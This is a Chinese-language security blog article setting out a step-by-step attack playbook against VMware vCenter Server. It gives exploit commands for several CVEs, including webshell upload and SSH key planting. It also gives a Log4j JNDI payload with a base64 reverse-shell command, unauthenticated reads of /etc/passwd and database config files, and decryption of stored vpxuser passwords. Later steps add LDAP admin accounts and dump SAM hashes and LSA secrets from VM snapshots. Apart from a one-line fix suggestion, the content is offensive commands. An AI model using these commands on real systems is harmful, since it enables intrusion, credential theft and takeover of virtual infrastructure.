---
title: vCenter Server 常用攻击手法
url: https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652500873&idx=1&sn=20dd0d5d017a2b73f78be82949354e2c&chksm=f258503ac52fd92ca153c193942b6407a7db55f73adacd85801faf9acdcc0997414d958d27fd&scene=58&subscene=0#rd
source: 雷神众测
date: 2022-12-08
fetch_date: 2025-10-04T00:53:40.491636
---

# vCenter Server 常用攻击手法

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyO2gT74AlbTzibVtbe9thwKfHyHgib5lhV3xwhXd11DBCkXndYeIJ3r1VQ/0?wx_fmt=jpeg)

# vCenter Server 常用攻击手法

原创

ChenZIDu

雷神众测

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOqzWGNuE12IYTBYng9Cxdibic4F2ib46pmflt0Honukqrfa0GgzY2wY2xA/640?wx_fmt=png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

查看版本信息

```
/sdk/vimServiceVersions.xml
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

cve-2021-22005

**1. 影响范围：**

* vCenter Server 7.0 < 7.0 U2c build-18356314
* vCenter Server 6.7 < 6.7 U3o build-18485166
* Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3)
* Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2)
* 6.7 vCenters Windows版本不受影响

```
python3 .\exp.py -t https://192.168.52.152 -s api_all_jdk.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOkEZsT8CVABrRJVRHqDXtepdPC4qym7USeibWTibTVQhZxgdJL1oeydlA/640?wx_fmt=png)

连接木马，默认路径/storage/db/vmware-vmdir/data.mdb

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOcdatjf2ExbmeWaJsmzkiafc8rJrcUdDbhZtb99mhk27byk8EXRQS5bQ/640?wx_fmt=png)

**2.vcenter\_saml\_login**

db数据库存放位置

```
数据库存放路径
Windows vCenter：C:/ProgramData/VMware/vCenterServer/data/vmdird/data.mdb
Linux vCenter：/storage/db/vmware-vmdir/data.mdb
```

拖到本地利用：vcenter\_saml\_login
配置cmd代理，利用netch到本地127.0.0.1:1080

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOUELHOmrPpBaSlmla3faHxiatmM1w6zqRylficduhoo0BzZtYtT8hCUVg/640?wx_fmt=png)

```
python3vcenter_saml_login.py-pdata.mdb-t1*.***.**.***
```

修改cookie进行连接

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOxSd2906fdWo2kJRHQsTHR4DNDhQFP3cdbicvHa6qsUuBqqZnbicJticibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

CVE-2021-21972

影响范围

* vCenter Server7.0 < 7.0.U1c
* vCenter Server6.7 < 6.7.U3l
* vCenter Server6.5 < 6.5.U3n

```
/ui/vropspluginui/rest/services/uploadova
```

访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞。

**1.windows机器：**

漏洞利用：https://github.com/horizon3ai/CVE-2021-21972

```
python CVE-2021-21972.py -t x.x.x.x -p c:\\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp

-t （目标地址）
-f （上传的文件）
-p （上传后的webshell路径，默认不用改）
```

上传后路径

```
https://x.x.x.x/statsreport/gsl.jsp
C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOicITjUgSDicGPNdtQ01IJV9t2aAbldVYic9fJEH7MujpsU04ZB6LhgaFg/640?wx_fmt=png)

**2. linux机器**

写公私钥（需要22端口开放）

```
python3 CVE-2021-21972.py -t 10.16.8.168 -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f c://Users/think/.ssh/id_rsa.pub
```

遍历写shell（时间较久）

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyO18VATzOtEEf75PYQVT4a7X9mrE4wd8awCHoonf3NFbbx8kIClbWKsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

CVE-2021-21985

```
java -cp  JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer 8.8.8.8

nc -lvvp 55552

python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

Log4j

${jndi:ldap://exp}

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "cmd /c whoami" -A "172.30.84.134"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base编码内容}|{base64,-d}|{bash,-i}" -A "ip"
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyObDP8HaHFtibodGVOUnHwzRhh0Fficv24R9yWp2xdjwec3445cEIxO25Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

vmware未授权任意文件读取漏洞

**漏洞影响版本**

已知影响版本 VMware vCenter 6.5.0a-f
安全版本 VMware vCenter 6.5u1

```
# windows
/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties

# linux
/eam/vib?id=/etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOtZAL70PL2f7LbOtfPQWFHsTxNaicAwOaiaN5qYfJono47PbBgqcl1Oibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

vCenter低权限账户提权思路

**获取ssh权限后修改密码**

```
# Linux
/usr/lib/vmware-vmdir/bin/vdcadmintool

# Windows
C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe

# 输入3回车
# 然后输入用户名(用户名输入错误会提示：VmDirForceResetPassword failed (9106))
# 复制生成的新密码(新密码不能自定义，只能工具生成的)
==================
Please select:
0. exit
1. Test LDAP connectivity
2. Force start replication cycle
3. Reset account password
4. Set log level and mask
5. Set vmdir state
6. Get vmdir state
7. Get vmdir log level and mask
==================
```

**Vmware数据库配置文件**

```
# linux
/etc/vmware-vpx/vcdb.properties
/etc/vmware/service-state/vpxd/vcdb.properties

# windows
C:\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties
```

连接数据库，读取 vpxuser 密钥

```
# linux
/opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc

# windows
C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc
```

**获取symkey.dat文件**

```
# linux
/etc/vmware-vpx/ssl/symkey.dat

# windows
C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
```

解密 vpxuser 密码

```
python3 decrypt.py symkey.dat password.enc password.txt
```

**拿到权限后添加账户**

添加账户

```
python vCenterLDAP_Manage.py adduser
input the new username: 1234admininput the dn: cn=1234admin,cn=Users,dc=vsphere,dc=localinput the userPrincipalName: 1234admin@vsphere.local
```

提升至管理员

```
python vCenterLDAP_Manage.py addadmininput the user dn: cn=1234admin,cn=Users,dc=vsphere,dc=local
```

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NTD37s76o9OBYsaxkVOBw3YebPRoyNyzbaOc4t8GgqibPZpibgLKdPRX3ZEqrOhOEYDToM8kbvhNZ1/640?wx_fmt=svg)

后续

**创建快照**

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOCkhia4rwN6mgloapRbIxib5lOdrCjvbMibht6hJHP0HJzUUg7LIIHW4xg/640?wx_fmt=png)

分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware ESXI上分析快照文件。

volatility下载：

Windows：

http://downloads.volatilityfoundation.org/releases/2.6/volatility\_2.6\_win64\_standalone.exe

Linux：

http://downloads.volatilityfoundation.org/releases/2.6/volatility\_2.6\_lin64\_standalone.zip

**volatility利用**

通过镜像信息获得系统版本，命令如下

```
.\volatility_2.6_win64_standalone.exe -f xxxx-Snapshot2.vmem imageinfo
```

读取profile，列出注册表内容

```
.\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hivelist

## 关注
REGISTRY\MACHINE\SYSTEM
SystemRoot\System32\Config\SAM
```

使用hashdump获取hash值

```
.\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hashdump -y 0xfffff8a000024010 -s 0xfffff8a000478010
```

从注册表读取LSA Secrets

```
.\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx lsadump
```

**修复建议：及时测试并升级到最新版本或升级版本。**

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWG3ZFWWk5UTiaiaufpfrmlyOkUibFPg29tbLkOxT2ghsfcNKxxA0ZcoW3ROWqwkYwsfibNSJYUmKFT...